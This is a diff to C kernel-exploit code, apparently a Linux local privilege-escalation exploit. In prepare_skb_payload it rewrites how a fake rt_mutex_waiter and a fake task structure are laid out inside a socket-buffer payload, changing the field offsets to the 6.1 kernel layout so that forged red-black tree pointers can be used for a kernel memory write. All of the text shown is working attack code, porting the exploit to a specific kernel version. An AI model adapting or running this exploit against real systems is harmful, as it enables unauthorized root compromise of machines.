@@ -501,20 +501,26 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x18, fake_task | 1);
     }
 
-    put64(p, W0_OFF + 0x00, 1);
-    put64(p, W0_OFF + 0x08, 0);
-    put64(p, W0_OFF + 0x10, 0);
-    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
-    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
-    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
-    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+    /* 6.1 legacy rt_mutex_waiter layout (BTF verified on shennong 6.1.138):
+     *   0x00 tree_entry (rb_node: pc/right/left)
+     *   0x18 pi_tree_entry (rb_node: pc/right/left)
+     *   0x30 task (ptr)
+     *   0x38 lock (ptr)
+     *   0x40 wake_state (u32)  0x44 prio (int)
+     *   0x48 deadline (u64)    0x50 ww_ctx (ptr)
+     * The 6.4+ FAKE_WAITER_* macros (0x28/0x50/0x58...) are WRONG for 6.1. */
+    put64(p, W0_OFF + 0x00, 1);                  /* tree_entry.pc */
+    put64(p, W0_OFF + 0x08, 0);                  /* tree_entry.right */
+    put64(p, W0_OFF + 0x10, 0);                  /* tree_entry.left */
+    put64(p, W0_OFF + 0x18, write_pc);           /* pi_tree_entry.pc */
+    put64(p, W0_OFF + 0x20, write_right);        /* pi_tree_entry.right */
+    put64(p, W0_OFF + 0x28, write_left);         /* pi_tree_entry.left */
+    put64(p, W0_OFF + 0x30, waiter_task);        /* task */
+    put64(p, W0_OFF + 0x38, fake_lock);          /* lock */
+    put32(p, W0_OFF + 0x40, 0);                  /* wake_state */
+    put32(p, W0_OFF + 0x44, FAKE_WAITER_PRIO);   /* prio */
+    put64(p, W0_OFF + 0x48, 0);                  /* deadline */
+    put64(p, W0_OFF + 0x50, 0);                  /* ww_ctx */
 
     put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
@@ -524,10 +530,11 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF, 0);
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08, 0);
     } else {
+      /* pi_waiters points to fake_w0+0x18 (6.1 pi_tree_entry offset) */
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF,
-            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+            fake_w0 + 0x18);
       put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_WAITERS_OFF + 0x08,
-            fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+            fake_w0 + 0x18);
     }
     put64(p, FAKE_TASK_OFF + FAKE_TASK_TASK_GROUP_OFF, task_group);
     put64(p, FAKE_TASK_OFF + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
